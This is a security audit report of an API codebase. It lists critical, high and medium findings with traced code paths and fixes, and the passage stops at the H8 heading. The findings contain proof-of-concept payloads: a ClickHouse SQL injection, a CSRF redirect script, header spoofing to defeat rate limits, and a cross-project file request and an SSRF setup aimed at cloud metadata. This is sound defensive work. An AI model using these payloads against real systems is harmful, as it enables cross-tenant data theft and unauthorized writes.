# Security pass — the API process spine (2026-09-04)

Read-only audit of `apps/api/src`, `packages/api/src`, `packages/features/{auth,api-key,share}/server`,
`packages/egress`, and the admin / export / webhook / OTLP / collector doors, on branch
`feat/strict-feature-layout-v0`. Nothing was modified, staged or committed. No secret value appears
below; where a credential is involved the file and line are named instead.

Every finding states the path traced from the request entry to the point the check is missing or
wrong. Where reachability could not be proven, the finding says so in its own words rather than being
dressed up as an exploit.

## Summary

| ID                                                                                                                 | Sev          | Finding                                                                                                                                                                                                                                       | Where                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------ | ------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| [C1](#c1--critical-sql-injection-into-clickhouse-through-seriesmetric)                                             | **Critical** | Free-string `series[].metric` reaches the ClickHouse SELECT list unsanitised — arbitrary cross-tenant read with an ordinary project API key                                                                                                   | `packages/features/analytics/server/src/clickhouse/metric-translator.ts:227, 291-296`                                                |
| [C2](#c2--critical-get-apisse-executes-any-trpc-procedure-mutations-included-on-a-lax-session-cookie)              | **Critical** | `GET /api/sse/*` invokes any tRPC procedure — all 308 mutations included — on a `SameSite=Lax` cookie, with no origin check and no procedure-type filter                                                                                      | `apps/api/src/app-trpc/app-trpc.sse.ts:113-122, 184-200, 263`                                                                        |
| [H1](#h1--high-the-clickhouse-tenantguard-is-fully-implemented-and-wired-to-nothing)                               | High         | The ClickHouse `TenantGuard` is complete, optional, and constructed only in tests                                                                                                                                                             | `packages/clickhouse-client/src/client.ts:41`; `apps/api/src/platform/infrastructure/api-clickhouse.infrastructure.ts:108`           |
| [H2](#h2--high-x-project-id-re-points-a-scoped-key-at-any-sibling-project-and-two-doors-behind-it-have-no-ceiling) | High         | `X-Project-Id` re-points a scoped API key at any sibling project, and two families behind it enforce no ceiling                                                                                                                               | `packages/features/api-key/server/src/services/api-key-token-resolution.service.ts:134-176`                                          |
| [H3](#h3--high-a-licensed-self-hosted-sso-install-refuses-sso-and-leaves-the-password-door-open)                   | High         | The API process hard-codes `federationLicensed: false`, so a licensed SSO install refuses SSO and leaves `/api/auth/sign-up/email` open                                                                                                       | `apps/api/src/app/api-better-auth.composition.ts:132`                                                                                |
| [H4](#h4--high-every-ip-keyed-throttle-is-keyed-on-a-header-the-caller-chooses)                                    | High         | Every IP-keyed throttle, better-auth's sign-in limit included, is keyed on an unvalidated caller-supplied header                                                                                                                              | `apps/api/src/app/api-client-address.ts:31-59`; `packages/features/auth/server/src/transport/better-auth/better-auth.api.ts:256-260` |
| [H5](#h5--high-the-public-rest-json-reader-buffers-the-whole-body-before-measuring-it)                             | High         | The public REST JSON reader buffers the whole body before measuring it, and skips its pre-check on chunked or non-integer `Content-Length`                                                                                                    | `packages/api/src/rest/public-rest-input.ts:91-105`                                                                                  |
| [H6](#h6--high-an-api-key-writes-model-defaults-with-its-owners-permissions)                                       | High         | An API key writes model defaults with its **owner's** permissions; the key's ceiling is never consulted                                                                                                                                       | `packages/features/model-provider/server/src/transport/api-rest/model-defaults.routes.ts:120-131`                                    |
| [H7](#h7--high-the-metadata-refusal-is-a-hostname-string-match-and-the-address-check-is-switched-off-by-default)   | High         | The "always refused" metadata check is a hostname string match, and the address check is `blockLocal`-gated with a default of false                                                                                                           | `packages/egress/src/ssrf/url-validator.ts:136-144, 176`; `packages/config/src/egress.config.ts:22-24`                               |
| [H8](#h8--high-a-bracketed-ipv6-host-walks-past-every-literal-check-on-an-unauthenticated-door)                    | High         | A bracketed IPv6 host defeats every literal check and is fetched unpinned, on the unauthenticated image proxy                                                                                                                                 | `packages/egress/src/ssrf/url-validator.ts:250, 276, 311-317`                                                                        |
| [H9](#h9--high-the-organization-audit-log-returns-other-organizations-project-rows)                                | High         | The organization audit log matches `projectId: { not: null }` — it returns other organizations' project rows, payloads included                                                                                                               | `packages/features/organization/server/src/repositories/prisma/prisma.organization-membership.repository.ts:1516-1523`               |
| [H10](#h10--high-customer-authored-liquid-templates-can-read-files-under-the-process-working-directory)            | High         | Customer-authored Liquid templates keep file inclusion, so `{% render %}` reads files under the process cwd                                                                                                                                   | `packages/features/scenario/contract/src/http-template-engine.ts:44, 49, 55` (+2 sites)                                              |
| [H11](#h11--high-the-image-proxy-serves-attacker-controlled-svg-from-the-app-origin-with-no-nosniff-and-no-csp)    | High         | The image proxy passes `image/svg+xml` through from the app origin with no `nosniff`, no CSP and no `Content-Disposition` — script execution on the product's own origin                                                                      | `apps/api/src/features/image-proxy/image-proxy-rest.ts:74-81`                                                                        |
| [M1](#m1--medium-rate-limiting-runs-after-the-body-is-read-parsed-and-validated)                                   | Medium       | Rate limiting runs after the body is read, parsed and validated — the opposite of its own stated contract                                                                                                                                     | `packages/api/src/rest/pipeline.ts:90-127`                                                                                           |
| [M2](#m2--medium-projectauthorization-calls-next-when-nothing-resolved)                                            | Medium       | `projectAuthorization` calls `next()` when no credential resolved — fail-open shape, reachability unproven                                                                                                                                    | `apps/api/src/api-rest.security.ts:349-354`                                                                                          |
| [M3](#m3--medium-an-empty-x-project-id-header-is-an-unauthenticated-500)                                           | Medium       | An empty `X-Project-Id` raises an unhandled `ZodError` — an unauthenticated 500 on every project REST route                                                                                                                                   | `apps/api/src/app/api-key-request-credentials.ts:25, 29`                                                                             |
| [M4](#m4--medium-framework-guards-that-are-declared-but-inert)                                                     | Medium       | Three framework guards that record and do not enforce: `permissionScope`, the `projectIdInput`-gated tenant check, and an empty chain under `internalSecret`                                                                                  | `packages/api/src/rest/pipeline.ts:681-689, 728-747`; `rest-api-service.ts:686-701`                                                  |
| [M5](#m5--medium-timing-unsafe-comparison-of-the-scim-webhook-shared-secret)                                       | Medium       | Timing-unsafe `!==` on the SCIM webhook shared secret, and no replay window                                                                                                                                                                   | `packages/enterprise/features/scim/server/src/transport/api-rest/scim-webhook-intake.api.ts:47-50`                                   |
| [M6](#m6--medium-legacy-project-keys-are-plaintext-permanent-unrevocable-and-ceiling-exempt)                       | Medium       | Legacy project keys are stored in plaintext, never expire, cannot be revoked, and are exempt from every ceiling                                                                                                                               | `packages/features/api-key/server/src/repositories/prisma/prisma.api-key.repository.ts:133-146`                                      |
| [M7](#m7--medium-share-links-default-to-permanent-public-and-unlimited-and-minting-is-uncapped)                    | Medium       | Share links default to permanent, public and unlimited views; minting is neither capped nor throttled                                                                                                                                         | `packages/features/share/server/src/transport/api-trpc/share.api.ts:62-113`                                                          |
| [M8](#m8--medium-post-apiauthvalidate-is-an-unauthenticated-unthrottled-key-oracle)                                | Medium       | `POST /api/auth/validate` is an unauthenticated, unthrottled key-validity and project oracle                                                                                                                                                  | `packages/features/auth/server/src/transport/api-rest/auth.api.ts:114-132`                                                           |
| [M9](#m9--medium-the-origin-gate-exists-but-is-mounted-only-on-apiauth)                                            | Medium       | The origin gate is correct but mounted only on `/api/auth/*`; admin, CLI-approve and logout carry none                                                                                                                                        | `packages/features/auth/server/src/transport/api-rest/auth.api.ts:218-241`                                                           |
| [M10](#m10--medium-two-more-declared-but-unenforced-claims)                                                        | Medium       | `/approve` declares a permission one branch never checks; the version guard registers `public` while dispatching the full stack; the route registry overwrites on collision                                                                   | `auth-cli-device-flow.api.ts:254-258`; `packages/api/src/rest/route-mounting.ts:91-107`; `route-registry.ts:26-38`                   |
| [M11](#m11--medium-two-egress-hardening-gaps-beside-the-fence)                                                     | Medium       | Image proxy has no size cap or timeout; outbound webhook TLS verification is off on self-hosted; allowlisted hostnames are not pinned                                                                                                         | `apps/api/src/features/image-proxy/image-proxy-rest.ts:62-80`; `apps/worker/src/app/worker-webhook-egress.composition.ts:76`         |
| [M12](#m12--medium-an-unencoded-path-segment-in-a-server-side-fetch-that-carries-the-project-api-key)              | Medium       | An unencoded `workflowId` path segment in a server-side fetch that attaches the project API key                                                                                                                                               | `apps/api/src/app/api-trpc-collaborators.execution.composition.ts:571-580`                                                           |
| [M13](#m13--medium-the-ops-explain-system-guard-is-bypassable-with-quoted-identifiers)                             | Medium       | The ops EXPLAIN `system.*` guard is bypassable with quoted identifiers, and misses `gcs` / `dictGet` / `mergeTreeIndex`                                                                                                                       | `packages/features/ops/server/src/services/ops-clickhouse-explain.core.ts:30, 124-143`                                               |
| [M14](#m14--medium-two-prisma-tenancy-defects-one-broken-feature-and-one-hardening-gap)                            | Medium       | `GatewayGuardrail` update/archive omit `projectId` (broken, fails closed); the guard's `projectId` check is a truthiness test                                                                                                                 | `prisma.gateway-guardrail.repository.ts:89-90, 104-105`; `packages/prisma-client/src/multi-tenancy-guard.ts:928-940`                 |
| [M15](#m15--medium-five-genuinely-project-scoped-models-are-exempt-from-the-prisma-tenancy-guard)                  | Medium       | Five project-scoped models — `Workflow`, `Evaluator`, `Scenario`, `BatchEvaluation`, `Agent` — are exempt from the Prisma tenancy guard so license rollups do not throw                                                                       | `packages/prisma-client/src/multi-tenancy-guard.ts:111-123`                                                                          |
| [M16](#m16--medium-eleven-project-list-endpoints-have-no-page-size-at-all)                                         | Medium       | Eleven project list endpoints have no page size; three read tables that grow with usage and take no pagination parameters at all                                                                                                              | `packages/features/prompt/server/src/transport/api-rest/prompt.api.ts:335-337, 678-680` (+9)                                         |
| [Low](#low--the-remaining-smaller-defects)                                                                         | Low          | 17 smaller items: `/metrics` open outside exactly-`production`, two `===` secret compares, a divergent 5xx error renderer, one shared anonymous rate-limit bucket, impersonation outliving staff status, `'unsafe-eval'` in the CSP, and more | see section                                                                                                                          |

**Coverage note.** The admin, metrics, health, static, OTLP, collector, image-proxy, stored-object,
user-avatar, model-defaults, SCIM-webhook, analytics-REST, prompt, annotation and secret-REST doors
were each read directly and appear above or in the verified list. A complete enumeration of every
mounted path against its declared policy — the export and download families in particular — remains
open work.

**Suggested order.** C1 first — a one-line fix for an arbitrary cross-tenant ClickHouse read reachable
with an ordinary project API key. Then C2 (a few lines, and it closes a live CSRF against every
mutation on the product) and H11 beside it, since the two chain. Then H2, H6 and H9 — all small, all
cross-boundary. Then H7 and H8 together,
since both are edits in `url-validator.ts` and together restore the "metadata is always refused"
invariant the spec already claims. H1 is the largest piece of work and the one that would have caught
C1 in review.

---

## C1 — Critical: SQL injection into ClickHouse through `series[].metric`

**Sink** `packages/features/analytics/server/src/clickhouse/metric-translator.ts:227` and `:291-296`.
Verified independently against the source, not taken on report.

The wire schema accepts a free string —
`packages/features/analytics/server/src/model/analytics-input.ts:86-88`:

```ts
export const seriesInputSchema = z.object({
  metric: z.string().min(1),
```

The docblock directly above it (`:76-83`) states the safety argument, and it is **false**: "the metric
translator, which refuses a key it has no expression for". It does not refuse:

```ts
// metric-translator.ts:290-296
  // Fallback for unknown metrics
  return {
    selectExpression: `count() AS ${alias}`,
```

And the alias sanitises everything **except** `metric` — `:227`:

```ts
const parts = [index.toString(), metric.replace(/\./g, "_"), aggregation];
if (key) parts.push(key.replace(/[^a-zA-Z0-9]/g, "_"));
if (subkey) parts.push(subkey.replace(/[^a-zA-Z0-9]/g, "_"));
```

`key` and `subkey` are stripped to `[a-zA-Z0-9_]`; `metric` only loses its dots. The alias is computed
at `:249` **before** any prefix routing, so a metric matching none of the six category prefixes and no
`getFieldMapping` entry falls to `:291` with the caller's text inside the alias. It reaches the SELECT
list at `aggregation-builder.ts:963-965` (`selectExprs.push(metric.selectExpression)`) and `:991-993`,
and executes at
`packages/features/analytics/server/src/repositories/clickhouse/clickhouse.analytics.repository.ts:100-102`
via `client.query({ query: built.sql, query_params: built.params })` — the SQL is a built string, and
only the _other_ values are bound.

**Two doors, both confirmed reachable.** tRPC `analytics.getTimeseries`
(`packages/features/analytics/server/src/transport/api-trpc/analytics.api.ts:145`, permission
`analytics:view`), and REST `POST /api/analytics/timeseries` —
`apps/api/src/features/analytics/analytics-rest.mount.ts:53` passes
`timeseriesInputSchema.omit({ projectId: true })`, i.e. the same unenumerated schema, authenticated by
an ordinary **project API key**.

**Exploit.** Any project member, or any holder of a project API key:

```json
{
  "startDate": 1,
  "endDate": 2,
  "timeZone": "UTC",
  "series": [
    {
      "metric": "x, (SELECT groupArray(TenantId) FROM trace_summaries) AS leak, 1",
      "aggregation": "sum"
    }
  ]
}
```

The injected scalar subquery carries no `TenantId` predicate and its result comes back in the `leak`
column of the response — arbitrary read across every tenant on the ClickHouse instance: traces, spans,
evaluations, gateway spend. `--` additionally truncates the rest of the statement, so `FROM` and
`WHERE` can be rewritten wholesale.

**Smallest correct fix.** One line, and it closes every fallback branch at once:

```ts
const parts = [index.toString(), metric.replace(/[^a-zA-Z0-9]/g, "_"), aggregation];
```

Then, separately and not as a substitute: make `metric` a `z.enum` over the translator's known keys,
and correct the now-false comment at `analytics-input.ts:76-83`.

---

## C2 — Critical: `GET /api/sse/*` executes any tRPC procedure, mutations included, on a Lax session cookie

**Files** `apps/api/src/app-trpc/app-trpc.sse.ts:113-122` (`procedureAt`), `:184-200` (route), `:263`
(`await procedure(input)`); `apps/api/src/api.application.ts:722-731` (the caller);
`apps/api/src/app/api-production.composition.ts:1986` (mounted in production).

**Path traced.** The lane is a bare GET wildcard:

```ts
// app-trpc.sse.ts:184
.get("/sse/*", async (c) => {
  const path = subscriptionPathOf(url);            // "/api/sse/a/b" -> "a.b"
  const input = inputParam ? superjson.parse(inputParam) : undefined;
  const caller = await ports.createCaller({ request: raw, signal: raw.signal });
  const procedure = procedureAt(caller, path);
  ...
  const result = await procedure(input);           // :263
```

`procedureAt` (`:117-121`) walks the caller by dotted path and returns **any** value whose `typeof`
is `"function"`. The caller is built at `api.application.ts:724` as `this.trpc.createCaller(...)`
over the whole composed router, and tRPC 11's `createCaller` exposes queries, mutations and
subscriptions identically as callable leaves. Nothing filters on `_def.type`. The module's own
docblock at `:154-164` says the lane streams subscriptions; the code does not restrict it to them.

The declared policy is `handlerManagedAuth({ reason: …, permissions: [], credential: "session" })`
(`:177-182`), and `handlerManagedAuth` applies **no chain at all**
(`packages/api/src/rest/security/rest-api-service.ts:696`). The suite states this outright — the
fixture docblock at `apps/api/src/app-trpc/__tests__/app-trpc.sse.unit.test.ts:34-39` says "a request
arriving with no credential still reaches the handler. That is the shape being asserted". So the only
thing between the request and the call is the session lookup in
`ApiRequestPolicy.createContext` (`apps/api/src/api-request.policy.ts:97-98`).

The main tRPC endpoint is safe from this: `fetchRequestHandler` refuses a mutation over GET. The SSE
lane bypasses that check entirely, and it is the **same router** by design
(`api.application.ts:719-721`).

**Why the cookie rides along.** better-auth 1.7 defaults the session cookie to `httpOnly`,
`path: "/"`, `sameSite: "lax"`. This deployment overrides nothing — `advanced` at
`packages/features/auth/server/src/transport/better-auth/better-auth.api.ts:256-260` sets only
`ipAddress`, and there is no `advanced.cookies` / `defaultCookieAttributes` anywhere. `SameSite=Lax`
releases the cookie on a cross-site **top-level GET navigation**. `grep -rni "csrf|checkOrigin|sec-fetch"`
over `apps/api/src` and `packages/api/src` returns one bespoke check, on the dataset direct-upload
route (`apps/api/src/features/dataset/dataset-direct-upload-auth.ts:51-58`) — nothing global. The
auth origin gate exists but is bound to the `/api/auth/*` catch-all only
(`packages/features/auth/server/src/transport/api-rest/auth.api.ts:218-241`).

**Exploit.** An attacker page a signed-in user visits:

```html
<script>
  location =
    "https://app.langwatch.ai/api/sse/project/regenerateApiKey" +
    "?input=" +
    encodeURIComponent(JSON.stringify({ json: { projectId: "proj_victim" } }));
</script>
```

`project.regenerateApiKey` is a mutation gated on `project:manage`
(`packages/features/project/server/src/transport/api-trpc/project.api.ts:264`) — the victim holds it,
the check passes, and the project's legacy API key is rotated, breaking every SDK and integration
using it. It is a blind write (the attacker cannot read the `text/event-stream` response cross-origin),
which is the only limit on it. **308 mutations** across the feature packages are reachable the same
way: key minting, role changes, project archival, monitor and prompt writes.

**Smallest correct fix.** Resolve the path against the router's own procedure record and refuse
anything that is not a subscription, before invoking:

```ts
const def = router._def.procedures[path]?._def;
if (def?.type !== "subscription") return c.json({ message: "Procedure not found" }, 404);
```

Add an `Origin` / `Sec-Fetch-Site` check on `/api/sse/*` as defence in depth — `isAllowedAuthOrigin`
in `packages/features/auth/server/src/transport/better-auth/origin-gate.ts` already implements it.

---

## H1 — High: the ClickHouse `TenantGuard` is fully implemented and wired to nothing

`packages/clickhouse-client/src/tenantGuard.ts` is 308 lines of careful work: it refuses a query
missing a `TenantId = {param:String}` bind, refuses an inlined tenant literal, refuses an `OR` at or
above the predicate's paren depth, and cross-checks the bound value against the caller's tenant.

It is an **optional** constructor field — `packages/clickhouse-client/src/client.ts:41`,
`tenantGuard?: TenantGuard | undefined` — and every `new ClickHouseQueryClient(` in the repository is
under `packages/clickhouse-client/src/__tests__/`. Production composes
`ClickHouseManagedClientService` (`apps/api/src/platform/infrastructure/api-clickhouse.infrastructure.ts:108`),
and `managed-client.ts:108-135` wraps the vendor client in resilience and a statement limiter with
**no tenant check**. The corroborating tell: there are zero `unscoped: { reason }` declarations in
production code, which is exactly what you would see if the guard had never run.

This is the "optional dependency nobody wires" class. It is also the backstop that would have made C1
noisy in review instead of silent.

_Fix:_ invoke `checkTenantScope` inside `ClickHouseManagedClientService`'s query path, or route
repositories through `ClickHouseQueryClient`, then declare the genuinely cross-tenant reads with
`unscoped: { reason }`.

---

## H2 — High: `X-Project-Id` re-points a scoped key at any sibling project, and two doors behind it have no ceiling

**File** `packages/features/api-key/server/src/services/api-key-token-resolution.service.ts:134-176`.

```ts
let effectiveProjectId = projectId; // <- the X-Project-Id header
if (!effectiveProjectId) {
  /* infer from a single PROJECT binding */
}
if (!effectiveProjectId) return null;
const project = await this.options.projects.tryGetIdentity(effectiveProjectId);
if (!project || project.organizationId !== apiKey.organizationId) return null; // the only fence
```

`apiKey.roleBindings` is consulted **only when the header is absent**. With the header present, the
caller-named project is checked against the key's organization and nothing else. That is deliberate —
`specs/security/api-endpoint-authorization.feature:93` documents an organization key reaching project
routes this way — and the design puts the real fence in the RBAC ceiling. The defect is the two
families that authenticate with no ceiling.

**Where the ceiling does run** (so the boundary is clear): the framework's project chain calls
`hasApiKeyPermission` at the _resolved_ project's scope
(`apps/api/src/api-rest.security.ts:349-376`), and OTLP ingest goes through
`ApiHandlerManagedCredentials.authenticate({ permission: "traces:create" })`
(`apps/api/src/app/api-trace-ingest.composition.ts:242`), which checks the ceiling at the named
project and refuses. Those doors are safe.

**Path A — stored-object bytes, no permission check at all.** `GET /api/files/:projectId/:id` is
registered `.access(anyAuthenticated())` with `verifySecret: dualAuth`
(`packages/features/stored-object/server/src/transport/api-rest/stored-object.api.ts:194-196, 429-431`).
`dualAuth` is `apps/api/src/app/api-dual-credential-auth.ts:121-134`, which resolves the token and
sets `apiKeyProjectId` — no `hasApiKeyPermission`, no `enforceCeiling`. The route's own gate is a bare
equality:

```ts
// stored-object.api.ts:216-219
if (apiKeyProjectId) {
  if (apiKeyProjectId !== ownerProjectId) throw new HTTPException(403, { message: "forbidden" });
}
```

`apiKeyProjectId` is exactly what the caller put in `X-Project-Id`, so the comparison always succeeds.
The `else if (userId)` branch beneath it runs real permission checks; the API-key branch does not.

**Exploit.** A member of organization _O_ holds a `restricted` key bound `PROJECT:A` with only
`traces:view`:

```
GET /api/files/<projectB-id>/<object-id>
Authorization: Bearer <the project-A key>
X-Project-Id: <projectB-id>
```

Project B's stored bytes — uploaded datasets, attachments — are served. The legacy id-only route
(`:437`) is the same hole.

**Path B — model defaults.** See finding 6; the same header decides `resolved.project`, and the route
authorizes on the key **owner's** user permissions rather than the key's.

**Boundary, stated precisely.** This crosses a _project_ boundary inside one organization, not a
tenant boundary — `project.organizationId !== apiKey.organizationId` holds. It defeats the entire
point of a scoped key.

**Smallest correct fix.** In `tryResolveCurrentApiKey`, when an explicit `projectId` is supplied,
accept it only if the key actually reaches it: an ORGANIZATION binding, a TEAM binding covering that
project's team, or a PROJECT binding for that id. Otherwise return `null`. Organization keys keep the
documented behaviour; the ceiling-less doors close without being touched.

---

## H3 — High: a licensed self-hosted SSO install refuses SSO and leaves the password door open

**Files** `apps/api/src/app/api-better-auth.composition.ts:129-140` and `:444-445`;
`packages/features/auth/server/src/transport/better-auth/better-auth.api.ts:98-101` and `:600-660`.

**Path traced**, for a self-hosted deployment with `NEXTAUTH_PROVIDER=auth0` and a genuine SSO licence:

1. `isEmailPasswordEnabled({ authProvider: "auth0", isSaas: false })` returns `true` — the rule is
   `authProvider === "email" || !isSaas` (`better-auth.api.ts:100-101`) — so `/sign-in/email` and
   `/sign-up/email` **mount**. The docblock above it says mounting is not the gate; the `before` hook
   is. So follow the hook.
2. `federation.federationCapable()` is `true` (`api-better-auth.composition.ts:124-127`), so the hook
   does not early-return at `better-auth.api.ts:605`.
3. `isCredentialMutationPath` blocks `/change-password`, `/set-password`, `/change-email`,
   `/verify-email` (`:610-618`). `/sign-up/email` is on a _different_ list (`EMAIL_AUTH_SUFFIXES`) and
   is not blocked here.
4. `policy.federationLicensed` is **hard-coded false** in this process:
   `federationLicensed: () => Promise.resolve(false)` (`api-better-auth.composition.ts:132`). So the
   ALLOW branch at `better-auth.api.ts:635-646` — the one that calls `refusesCredentialRoute` and
   blocks `/sign-up/email` — is dead code on the API process.
5. The DENY branch at `:650-660` fires instead and refuses every `isGatedSsoPath` with
   `SSO_LICENSE_REQUIRED`.

Net result: SSO initiation and callbacks are refused, and `/api/auth/sign-up/email` is open. That is
the exact inversion of the invariant the comment at `better-auth.api.ts:366-386` states.

**Exploit.**

```
POST /api/auth/sign-up/email
{"email":"victim@corp.com","password":"…","name":"…"}
```

against a licensed self-hosted install whose organization enforces its IdP. `emailAndPassword` sets no
`requireEmailVerification` (`:387-415`), so the account is created and signed in with no proof of
address control. Where `ADMIN_EMAILS` names an operator whose account does not yet exist, this also
confers staff status, because `AdminAccessService.isAdmin` matches on the address alone
(`packages/features/ops/server/src/services/admin-access.service.ts:27-30`).

The composition docblock at `api-better-auth.composition.ts:65-69` names the absent licensing store —
so the gap is known — but names it as "reports no federated mode", not as "leaves the password door
open on a licensed install", which is the security consequence.

**Smallest correct fix.** Until a licensing store is composed here, make the credential-mint routes
unconditional on federation capability: move `isEmailAuthPath(pathname)` into the block at
`better-auth.api.ts:611`, leaving the password-reset pair on its existing gate-dependent path. The
durable fix is composing `federationLicensed` so it answers for real.

---

## H4 — High: every IP-keyed throttle is keyed on a header the caller chooses

**Files** `apps/api/src/app/api-client-address.ts:31-59`;
`packages/features/auth/server/src/transport/better-auth/better-auth.api.ts:256-260`.

`apiClientAddress` walks ten caller-supplied headers, `cf-connecting-ip` first, and returns the first
that _parses_ as an address:

```ts
for (const header of ADDRESS_HEADERS) {
  // :32-37
  const value = c.req.header(header);
  if (!value) continue;
  const address = parseAddress(value);
  if (address) return address;
}
```

`parseAddress` (`:70-77`) validates the **format**. The docblock at `:64-69` says "Validated rather
than trusted … an unvalidated one becomes a rate-limit key an attacker chooses" — but format
validation is not provenance. `grep -rni "trustproxy|trustedProxy|proxyHops|TRUST_PROXY"` over
`apps/api/src`, `packages/api/src` and `packages/features/auth` returns nothing: there is no
trusted-proxy list, no hop count, and no check that the request arrived through the edge. better-auth's
own limiter reads the same three headers in the same order with the same absence of a trust boundary.

**Exploit.** Credential stuffing against `POST /api/auth/sign-in/email`, whose rule is
`{ window: 900, max: 30 }` (`better-auth.api.ts:429`): send each attempt with a fresh
`cf-connecting-ip: 203.0.113.<n>`. Each attempt lands in its own fixed window, so the cap never binds.
The same header defeats `/request-password-reset` (5/hour, `:441`), `/sign-up/email` (50/hour, `:430`),
the front-door throttles, and `sharedTrace.get`'s per-address ceiling
(`packages/features/trace/server/src/transport/api-trpc/shared-trace.api.ts:161-170`).

**Reachability caveat.** Behind Cloudflare the edge overwrites `cf-connecting-ip`, so on the hosted
product this needs a path to the origin that bypasses the edge. I did not verify whether one exists.
For self-hosted installs and any direct-to-origin route it is exploitable as written.

**Smallest correct fix.** Make the trusted header explicit, configured, and defaulting to none — one
value the operator sets to match their edge — and set the same single header on better-auth's
`advanced.ipAddress.ipAddressHeaders`. Fall back to the socket address otherwise.

---

## H5 — High: the public REST JSON reader buffers the whole body before measuring it

**File** `packages/api/src/rest/public-rest-input.ts:91-105`.

```ts
const contentLength = context.req.header("content-length");
if (contentLength !== undefined && Number(contentLength) > maxInputBytes) {
  throw inputError("request_too_large", …);
}
const text = await context.req.text();                                  // whole body buffered
if (new TextEncoder().encode(text).byteLength > maxInputBytes) { … }
```

**Path from entry:** request → `SecuredApp` → `buildEndpointMiddlewareStack`
(`packages/api/src/rest/pipeline.ts:78`) → for `ep.kind === "public-rest"`, `validatedInputMiddleware`
(`pipeline.ts:97-104`) → `parsePublicRestInput` → `readJsonObject`.

Two ways past the pre-check:

1. **No `Content-Length`.** Chunked transfer — which every OTel exporter and most streaming clients
   use — leaves `contentLength === undefined`, so the guard is skipped and `text()` buffers the whole
   body before line 103 measures it.
2. **A non-integer `Content-Length`.** `Number("100, 5000000000")` and `Number("abc")` are `NaN`, and
   `NaN > maxInputBytes` is `false`.

The correct logic already exists one directory away: `declaredSize()` in
`packages/api/src/rest/body-limit.ts:60-70` tests `/^\d+$/`, `Number.isSafeInteger`, **and**
`transfer-encoding`, and `drainWithinCap` (`:17`) stops mid-stream.

**Exploit.** `POST /api/v1/<family>/<path>` with `Transfer-Encoding: chunked`,
`Content-Type: application/json` and a multi-gigabyte body dribbled slowly. Each concurrent request
holds its whole body as a JS string in the API heap. Finding 7 explains why the rate limiter does not
fire first.

**Smallest correct fix.** In `readJsonObject`, use `declaredSize(headers)` for the pre-check and
`drainWithinCap` in place of `context.req.text()` — both are already in this package.

---

## H6 — High: an API key writes model defaults with its owner's permissions

**File** `packages/features/model-provider/server/src/transport/api-rest/model-defaults.routes.ts:120-131`
(and `:157-171`, `:194-…` for PUT and DELETE).

```ts
const userId = c.get("apiKeyUserId");
if (!userId) throw new ModelDefaultUserKeyRequiredError();
const saved = await modelProviders().saveDefaultConfig({
  config: body.config,
  scopes: body.scopes, // scopes come from the REQUEST BODY
  authorId: userId ?? null,
  actorId: userId, // the key's OWNING USER
});
```

`apiKeyUserId` is installed from the resolved credential at `apps/api/src/api-rest.security.ts:635`.
Authorization then runs at
`packages/features/model-provider/server/src/services/model-provider-defaults-write.service.ts:85-86`
→ `model-provider-write-authorization.service.ts:29-42` → `canWrite(actorId, scope)` — a **user**
principal. `hasApiKeyPermission` is never called on this path, so the key's `roleBindings` and
`permissionMode` are inert. The routes are `.access(anyAuthenticated())` (`:101, 146, 185`), so the
framework's `projectAuthorization` never runs either.

**Exploit.** An organization admin mints a deliberately narrow CI key — `restricted`, `PROJECT:A`,
read-only. Anyone who reads that key out of CI logs can:

```
POST /api/model-defaults
Authorization: Bearer <the narrow key>
{"config":{"DEFAULT":"…"},"scopes":[{"scopeType":"ORGANIZATION","scopeId":"<orgId>"}]}
```

and repoint the organization's default and LANGY models at a provider they control. The scoping that
was meant to prevent exactly this does nothing.

**Smallest correct fix.** Call `ApiHandlerManagedCredentials.enforceCeiling({ resolved, permission })`
before `saveDefaultConfig` on all three routes — the composition already exposes it at
`apps/api/src/app/api-handler-managed-credential.ts:135-152` — so the key's ceiling caps the owner's
grant.

---

## H7 — High: the metadata refusal is a hostname string match, and the address check is switched off by default

**Files** `packages/egress/src/ssrf/url-validator.ts:136-144` (`validateNotMetadataEndpoint`),
`:158-169` (`validateNotPrivateIpLiteral`), `:170-192` (`validateResolvedAddresses`), `:326`;
`packages/config/src/egress.config.ts:22-24`.

`blockLocalHttpCalls` is read through `environmentOneOrTrueSchema`, and
`packages/config/src/runtime-config.ts:43-50` transforms `undefined` to `false`. The file's own
docstring says an unset allowlist is an empty one rather than a wildcard — the allowlist got that
treatment, the block flag did not. This is the shipped default:

- `.env.example:445` ships `BLOCK_LOCAL_HTTP_CALLS=false`.
- `charts/langwatch/templates/{app,workers}/deployment.yaml` never set the variable at all
  (`grep -rn BLOCK_LOCAL charts/` matches only `langwatch_nlp/deployment.yaml:115` and
  `charts/gateway/templates/configmap.yaml:39`, both defaulting to `false`).

It flows to `blockLocal` at `apps/api/src/app/api-production.composition.ts:793 → 1938` (image proxy)
and `:3087, :3590` (model-provider probe).

**The compounding defect.** With `blockLocal: false`, `validateResolvedAddresses` returns before it
looks at anything (`:176`: `if (!blockLocal) return;`). The "always refused, before anything an
operator can relax" guarantee at `:259-262` then rests entirely on a literal comparison of the
**hostname**:

```ts
if (BLOCKED_METADATA_HOSTS.some((host) => host === ctx.hostname))    // :137
```

So a DNS name that resolves to `169.254.169.254` is admitted, and then **pinned to it** at `:326`
(`const resolvedIp = allAddresses[0]!`). `packages/egress/specs/webhook-egress.feature:76` — "A cloud
metadata host is refused whatever the local-address policy says" — is not met. No test covers it:
`url-validator.unit.test.ts:99-106` exercises the permissive policy against **literal** metadata hosts
only.

**Exploit.** A member with `evaluations:manage` saves a custom provider endpoint
`http://imds.<attacker-domain>/latest/meta-data/iam/security-credentials/` (A record
`169.254.169.254`) via tRPC `modelProvider.update`
(`packages/features/model-provider/server/src/transport/api-trpc/model-provider.api.ts:376`), then
calls `modelProvider.validateApiKey` (`:419`). On a default Helm install the probe reaches IMDS from
inside the cluster. It is a **blind** oracle — `probeOnce` returns a verdict, never a body
(`http.model-provider-credential-probe.adapter.ts:910-916`) — so this is metadata reachability and
internal host/port discovery, not direct credential exfiltration.

**Smallest correct fix.** Two lines, independent of the flag's default:

```ts
// validateResolvedAddresses, before the blockLocal early return
if (addresses.some((ip) => classifyEgressAddress(ip) === "metadata")) throw new Error(…);
if (!blockLocal) return;
```

`classifyEgressAddress` is already imported at `:4`. Do the same in `validateNotPrivateIpLiteral`.
Flipping the config default to `true` is right as well, but the metadata refusal must not depend on it.

---

## H8 — High: a bracketed IPv6 host walks past every literal check, on an unauthenticated door

